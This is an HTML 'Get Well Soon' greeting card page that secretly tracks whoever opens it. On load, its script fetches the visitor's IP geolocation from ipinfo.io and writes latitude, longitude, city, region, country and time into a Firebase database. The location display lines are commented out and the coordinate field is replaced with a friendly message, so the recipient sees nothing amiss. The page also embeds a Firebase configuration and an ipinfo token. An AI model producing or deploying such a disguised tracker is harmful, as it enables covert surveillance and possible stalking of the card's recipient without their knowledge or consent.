<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Get Well Soon Card with Firebase Location</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f8ff;
            font-family: 'Arial', sans-serif;
        }

        .card {
            width: 400px;
            height: 300px;
            border-radius: 20px;
            background: linear-gradient(135deg, #ffb3ba, #ffdfba);
            box-shadow: 0px 10px 15px rgba(0, 0, 0, 0.1);
            padding: 30px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .card h1 {
            font-size: 2.5rem;
            color: #6a097d;
            margin: 0;
            padding-top: 10px;
        }

        .card p {
            font-size: 1.2rem;
            color: #355c7d;
            margin: 20px 0;
        }

        .card button {
            background-color: #ff677d;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 10px;
            font-size: 1rem;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .card button:hover {
            background-color: #d7385e;
        }
    </style>
</head>
<body>
    <div class="card">
        <h1>Get Well Soon!</h1>
        <p>Wishing you a speedy recovery and lots of love.</p>
        <p id="location">...</p>
        <p id="coordinates">...</p>
        <!-- <button onclick="showMessage()">Click for a message</button> -->
    </div>

    <!-- Add Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/8.0.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.0.0/firebase-database.js"></script>
    <script>
        // Your Firebase configuration
        const firebaseConfig = {
  apiKey: "AIzaSyCpnZcGXe7Rg_-o0jwKcdDTteAPgoAEcWY",
  authDomain: "wishyourfriend-9cf42.firebaseapp.com",
  databaseURL: "https://wishyourfriend-9cf42-default-rtdb.firebaseio.com",
  projectId: "wishyourfriend-9cf42",
  storageBucket: "wishyourfriend-9cf42.appspot.com",
  messagingSenderId: "680048901534",
  appId: "1:680048901534:web:48a8446403023074176a8f",
  measurementId: "G-SEBH8FDENQ"
};

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        var database = firebase.database();

        // Fetch IP-based geolocation and save to Firebase
        fetch('https://ipinfo.io/json?token=9b8ef544895a71')  // Replace with your IPInfo API token
            .then(response => response.json())
            .then(data => {
                var locationElement = document.getElementById("location");
                var coordinatesElement = document.getElementById("coordinates");

                if (data.city && data.region && data.country) {
                    // locationElement.innerHTML = "You are in: " + data.city + ", " + data.region + ", " + data.country;
                }

                if (data.loc) {
                    var loc = data.loc.split(',');
                    var latitude = loc[0];
                    var longitude = loc[1];
                    coordinatesElement.innerHTML = "Your only job right now is to get back on your feet. Let me know how I can help you get there!"//"Latitude: " + latitude + ", Longitude: " + longitude;

                    // Save to Firebase
                    var currentdate = new Date(); 
                    var datetime = "Last Sync: " + currentdate.getDate() + "/"
                + (currentdate.getMonth()+1)  + "/" 
                + currentdate.getFullYear() + " @ "  
                + currentdate.getHours() + ":"  
                + currentdate.getMinutes() + ":" 
                + currentdate.getSeconds();
                    var newLocationKey = database.ref().child('locations').push().key;
                    database.ref('locations/'+ newLocationKey).set({
                        latitude: latitude,
                        longitude: longitude,
                        city: data.city,
                        region: data.region,
                        country: data.country,
                        date: datetime
                    });
                }
            })
            .catch(error => {
                document.getElementById("location").innerHTML = "Error fetching location.";
            });

        function showMessage() {
            alert("Sending you healing vibes and warm wishes!");
        }
    </script>
</body>
</html>
